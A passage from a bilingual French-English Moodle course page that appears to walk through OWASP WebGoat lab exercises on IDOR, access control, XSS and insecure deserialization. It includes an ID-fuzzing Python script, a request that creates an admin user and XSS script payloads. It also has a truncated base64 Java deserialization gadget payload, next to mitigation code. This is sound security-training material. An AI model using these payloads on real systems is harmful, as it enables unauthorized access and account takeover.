				</span>
				<span class="multilang" lang="en">
					In the lesson 3, click on <b>View Profile</b>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>profile</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Réponse</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>blind</code> in the <i>Network</i> tab and click on <i>Response</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Remarque le paramètre <b>userID</b>, la réponse attendue est <b>WebGoat/IDOR/profile/userID_value</b>.
				</span>
				<span class="multilang" lang="en">
					Notice the paramter <b>userID</b>, the expected answer is <b>WebGoat/IDOR/profile/userID_value</b>.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/774567665/idor-4.png" alt="IDOR 4" class="img-responsive atto_image_button_text-bottom" width="800" height="291">
		<div><br></div>
		5.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The default request here won't work at all, so you will need to manually craft the request or tamper it with a proxy
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You will likely need to 'fuzz' to try different values for the userId at the end of the Url
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try incrementing the id value. It's not a simple +1, but it's also not too far off
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		For editing the other user's profile, you will need to use the proxy or manually craft the request again
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		To edit the other user's profile, you will use the same Url you did to view the other user's profile
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		To edit, You will need to change the method, what is the RESTful method used for 'update' or 'edit'?
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You will also need the body of the request (will look something like the profile)
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The request should go to ... /WebGoat/IDOR/profile/{Buffalo Bills Id}
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Your payload should look something like ... {"role" : 1,"color" : "red","size" : "small","name" : "Tom Cat","userId" : "2342388"}
		<div><br></div>
		<b>View Another Profile</b>:
		<br>
		<span class="multilang" lang="fr">
			Le script ci-dessous permet de <i>fuzzer</i> l'URL trouvée dans l'exercice précédent pour trouver un autre profil. On en trouve un ayant pour <b>id</b> 2342388.
		</span>
		<span class="multilang" lang="en">
			The script below <i>fuzz</i> the URL found in the previous exercise to find another profile. We find one at 2342388.
		</span>
		<div><br></div>
		<code>
			import requests
			<br>
			<br>
			def idor_5():
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; index = 2342300
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; headers = {
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'Cookie': COOKIE,
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; }
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; while True:
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r = requests.get('http://192.168.99.100:8080/WebGoat/IDOR/profile/{}'.format(index), headers=headers)
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if r.status_code != 500 and index != 2342384:
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print("Index: {}".format(index))
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index += 1
			<br>
			<br>
			idor_5()
		</code>
		<div><br></div>
		<b>Edit Another Profile</b>:
		<br>
		<span class="multilang" lang="fr">
			Envoyer une requête PUT vers http://192.168.99.100:8080/WebGoat/IDOR/profile/2342388 avec pour en-tête <code>Content-Type: application/json</code>
			et pour corps <code>{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}</code>
		</span>
		<span class="multilang" lang="en">
			Send a PUT request to http://192.168.99.100:8080/WebGoat/IDOR/profile/2342388 with header <code>Content-Type: application/json</code>
			and body <code>{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}</code>
		</span>
	</div>
	<div>
		<div><br></div>
		<h5>Missing Function Level Access Control</h5>
		<div><br></div>
		2.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You can inspect the DOM or review the source in the proxy request/response cycle.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Look for indications of something that would not be available to a typical user
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Look for something a super-user or administator might have available to them
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Effectuer un clic-droit sur l'élément <b>Log Out</b>, et cliquer sur <i>Examiner l'élément</i>.
				</span>
				<span class="multilang" lang="en">
					Right-click on the <b>Log Out</b> element, and click on <i>Inspect Element</i>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Juste en dessous dans le HTML, on trouve des champs cachés, dont les champs : <b>Users</b>, <b>Config</b>.
				</span>
				<span class="multilang" lang="en">
					Just below in the HTML, we can see hidden fields: <b>Users</b>, <b>Config</b>.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/461537150/mflac-2.png" alt="MFLAC 2" class="img-responsive atto_image_button_text-bottom" width="800" height="291">
		<div><br></div>
		3.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		There is an easier way and a 'harder' way to achieve this, the easier way involves one simple change in a GET request.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		If you haven't found the hidden menus from the earlier exercise, go do that first.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		When you look at the users page, there is a hint that more info is viewable by a given role. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		For the easy way, have you tried tampering the GET request? Different content-types? 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		For the 'easy' way, modify the GET request to /users to include 'Content-Type: application/json'
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Now for the harder way ... it builds on the easier way'
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		If the request to view users, were a 'service' or 'RESTful' endpoint, what would be different about it?
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		If you're still looking for hints ... try changing the Content-type header as in the GET request.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You also need to deliver a proper payload for the request (look at how registration works). This should be formatted in line with the content-type you just defined.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	    You will want to add WEBGOAT_ADMIN for the user's role. Yes, you'd have to guess/fuzz this in a real-world setting. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		OK, here it is. First, create an admin user ... Change the method to POST, change the content-type to "application/json". And your payload should look something like: {"username":"newUser2","password":"newUser12","matchingPassword":"newUser12","role":"WEBGOAT_ADMIN"}
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Now log in as that user and bring up WebGoat/users. Copy your hash and log back in to your original account and input it there to get credit.
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Aller sur  http://host:port/WebGoat/users.
				</span>
				<span class="multilang" lang="en">
					Go to  http://host:port/WebGoat/users.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>users</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Modifier et Renvoyer</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>users</code> in the <i>Network</i> tab and click on <i>Edit and Resend</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Ajouter l'en-tête <code>Content-Type: application/json</code>.
				</span>
				<span class="multilang" lang="en">
					Add the header <code>Content-Type: application/json</code>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Récupérer le <i>hash</i> en réponse.
				</span>
				<span class="multilang" lang="en">
					Check the hash in the response.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/338159014/mflac-3.png" alt="MFLAC 3" role="presentation" class="img-responsive atto_image_button_text-bottom" width="800" height="341">
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/179355077/mflac-3-2.png" alt="MFLAC 3" class="img-responsive atto_image_button_text-bottom" width="800" height="260">
		<div><br></div>
	</div>
</div>

<div><br></div>
<div><br></div>

<div>
	<h4><u><b>(A7) Cross-Site Scripting (XSS):</b></u></h4>
	<div>
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Dans le panneau à gauche, la <i>checkbox</i> verte qui est censée apparait après complétion de l'ensemble des leçons d'un sujet n'apparait pour aucune des trois leçons.
		</span>
		<span class="multilang" lang="en">
		In the left panel, the green checkbox that is supposed to appear after completing all the lessons of a topic does not appear for any of the three lessons.
		</span>
		<div><br></div>
		<h5>Cross Site Scripting</h5>
		<div><br></div>
		<span class="multilang" lang="fr">
			2. Les principaux navigateurs ont banni le Javascript de la barre d'URL, contrairement à ce que laisse penser la consigne. Ouvrir plutôt les <i>Outils de développements</i>, et l'onglet <i>Console</i>. La réponse attendue est <code>Yes</code>.
		</span>
		<span class="multilang" lang="en">
			2. The main browsers have banned Javascript from the URL bar, contrary to what the suggestion say. Open the <i>Development Tools</i>, and the <i>Console</i> tab instead. The expected answer is <code>Yes</code>.
		</span>
		<div><br></div>
		7.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Think about how the inputs are presumably processed by the application.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Quantity inputs are probably processed as integer values. Not the best option for inputting text right?
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		What information send to the application gets reflected back after being submitted?  
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Just try purchasing something. You want your script to be included in the purchase-confirmation. 
		<div><br></div>
		<span class="multilang" lang="fr">
			Entrer <code>&lt;script&gt;alert()&lt;/script&gt;</code> dans la case <b>Enter your credit card number:</b>.
		</span>
		<span class="multilang" lang="en">
			Put <code>&lt;script&gt;alert()&lt;/script&gt;</code> in the box <b>Enter your credit card number:</b>.
		</span>
		<div><br></div>
		10.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		To search through the client side code, use the developer tools of your browser. (If you don't know how to use them, check the Developer Tools Lesson in the general category.)
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Since you are looking for application code, check the WebGoat/js/goatApp folder for a file that could handle the routes.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Make sure you add the base route at the start, when submitting your solution. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Still did not find it? Check the GoatRouter.js file. It should be pretty easy to determine.
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Débogueur</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Debugger</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer le fichier <code>goatApp/View/GoatRouter.js</code> et l'ouvrir.
				</span>
				<span class="multilang" lang="en">
					Locate the <code>goatApp/View/GoatRouter.js</code> file and open it.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Recherchez le mot <b>routes</b> dans le fichier pour tomber sur <code>'test/:param': 'testRoute'</code>.
				</span>
				<span class="multilang" lang="en">
					Look for <b>routes</b> to find <code>'test/:param': 'testRoute'</code>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					La réponse attendue est alors <code>start.mvc#test/</code>.
				</span>
				<span class="multilang" lang="en">
					The expected answer is then <code>start.mvc#test/</code>.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/256675706/xss-10.png" alt="XSS 10" class="img-responsive atto_image_button_text-bottom" width="800" height="262">
		<div><br></div>
		11.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Open a new tab and navigate to the test-route you just figured out in the previous lesson.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Your url should look something like that http://localhost:8080/WebGoat/start.mvc#REPLACE-WITH-THE-TEST-ROUTE/some_parameters
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Note how the parameters you send to the test-route get reflected back to the page. Now add your JavaScript to it.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You have to use script tags, so your JavaScript code gets executed when being rendered into the DOM.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Since you are working with an URL, you might have to URL-encode your parameters.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Replace '/' with '%2F' in your URL parameters.
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Console</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Console</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Naviguer vers l'URL
					<a href="http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;">http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;</a>
				</span>
				<span class="multilang" lang="en">
					Navigate to the URL
					<a href="http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;">http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;</a>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Récupérer le numéro en sortie de la fonction.
				</span>
				<span class="multilang" lang="en">
					Retrieve the number in the function output.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/358069288/xss-11.png" alt="XSS 11" class="img-responsive atto_image_button_text-bottom" width="800" height="167">
		<div><br></div>
		12.
		<div><br></div>
		<b>1. Are trusted websites immune to XSS attacks?</b>
		<div><br></div>
		Solution 4: No because the browser trusts the website if it is acknowledged trusted, then the browser does not know that the script is malicious.
		<div><br></div>
		<b>2. When do XSS attacks occur?</b>
		<div><br></div>
		Solution 3: The data is included in dynamic content that is sent to a web user without being validated for malicious content.
		<div><br></div>
		<b>3. What are Stored XSS attacks?</b>
		<div><br></div>
		Solution 1: The script is permanently stored on the server and the victim gets the malicious script when requesting information from the server.
		<div><br></div>
		<b>4. What are Reflected XSS attacks?</b>
		<div><br></div>
		Solution 2: They reflect the injected script off the web server. That occurs when input sent to the web server is part of the request.
		<div><br></div>
		<b>5. Is JavaScript the only way to perform XSS attacks?</b>
		<div><br></div>
		Solution 4: No there are many other ways. Like HTML, Flash or any other type of code that the browser executes.
		<div><br></div>
	</div>
	<div>
		<div><br></div>
		<h5>Cross Site Scripting (stored)</h5>
		<div><br></div>
		3.
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Console</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Poster <code>&lt;script&gt;webgoat.customjs.phoneHome()&lt;/script&gt;</code> en commentaire.
				</span>
				<span class="multilang" lang="en">
					Comment with <code>phoneHome Response is &lt;script&gt;webgoat.customjs.phoneHome()&lt;/script&gt;</code>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Récupérer le numéro en sortie de la fonction.
				</span>
				<span class="multilang" lang="en">
					Retrieve the number in the function output.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/498564022/xss-stored-3.png" alt="XSS Stored 3" class="img-responsive atto_image_button_text-bottom" width="800" height="182">
		<div><br></div>
	</div>
	<div>
		<div><br></div>
		<h5>Cross Site Scripting (mitigation)</h5>
		<div><br></div>
		5.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You do not store the user input in this example. Try to encode the user's input right before you place it into the HTML document.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Make use of JavaServer Pages Standard Tag Library (JSTL) and JSP Expression Language.	
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Take a look at OWASP Java Encoder Project.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Do not forget to reference the tag libs and choose "e" as prefix.
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					La première ligne doit contenir : <code>&lt;%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %&gt;</code>
				</span>
				<span class="multilang" lang="en">
					The first line shoud contain: <code>&lt;%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %&gt;</code>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Remplacer <code>&lt;%= request.getParameter("first_name")%&gt;</code> par <code>${e:forHtml(param.first_name)}</code>.
				</span>
				<span class="multilang" lang="en">
					Replace <code>&lt;%= request.getParameter("first_name")%&gt;</code> with <code>${e:forHtml(param.first_name)}</code>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Remplacer <code>&lt;%= request.getParameter("last_name")%&gt;</code> par <code>${e:forHtml(param.last_name)}</code>.
				</span>
				<span class="multilang" lang="en">
					Replace <code>&lt;%= request.getParameter("last_name")%&gt;</code> with <code>${e:forHtml(param.last_name)}</code>.
				</span>
			</li>
		</ul>
		<div><br></div>
		6.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try to have a look at the AntiSamy documentation.
		<div><br></div>
		<br>
		<span class="multilang" lang="fr">
		Le code suivant permet de valider la leçon.
		</span>
		<span class="multilang" lang="en">
		The following code validate the lesson.
		</span>
		<div><br></div>
		<code>
			import org.owasp.validator.html.*;
			<br>
			import MyCommentDAO;
			<br>
			<br>
			public class AntiSamyController {
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; public void saveNewComment(int threadID, int userID, String newComment){
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Policy p = Policy.getInstance("antisamy-slashdot.xml");
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AntiSamy as = new AntiSamy();
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CleanResults cr = as.scan(newComment, p, AntiSamy.DOM);
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MyCommentDAO.addComment(threadID, userID, cr.getCleanHTML());
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; }
			<br>
			}
			<br>
		</code>
	</div>
</div>

<div><br></div>
<div><br></div>

<div>
	<h4><u><b>(A8) Insecure Deserialization:</b></u></h4>
	<div>
		<div><br></div>
		<h5>Insecure Deserialization</h5>
		<div><br></div>
		5.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Je n'ai pas réussi à valider la leçon, ci-dessous, quelques pistes de recherche.
		</span>
		<span class="multilang" lang="en">
		I could'nt validate the lesson, you can find my search below.
		</span>
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
				Le package à utiliser pour déclencher la faille serait Hibernate 5.
				</span>
				<span class="multilang" lang="en">
				The package to use to trigger the flaw seems to be Hibernate 5.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Le payload suivant, trouvé dans un 
					<a href="https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/src/burp/BurpExtender.java">module</a> 
					de Burp Suite fonctionne, mais déclenche un <i>sleep</i> de 10 secondes:
				</span>
				<span class="multilang" lang="en">
					The following payload, found in a 
					<a href="https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/src/burp/BurpExtender.java">Burp Suite module</a>
					works but triggers a 10 seconds sleep.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					La <a href="https://github.com/frohoff/ysoserial">bibliothèque ysoserial</a> semble être une piste de recherche aussi.
				</span>
				<span class="multilang" lang="en">
					The <a href="https://github.com/frohoff/ysoserial">ysoserial library</a> seems to be a search track too.
				</span>
			</li>
		</ul>
		<code>
			rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL